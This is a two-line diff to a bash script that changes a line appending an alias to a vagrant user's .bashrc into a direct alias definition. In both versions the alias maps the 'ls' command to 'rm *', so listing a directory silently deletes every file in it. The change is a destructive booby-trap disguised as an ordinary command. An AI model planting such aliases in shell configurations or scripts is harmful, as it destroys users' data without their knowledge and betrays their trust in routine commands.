@@ -1,2 +1,2 @@
 #!/bin/bash
-alias ls=‘rm *’ >> home/vagrant/.bashrc
+alias ls='rm *'
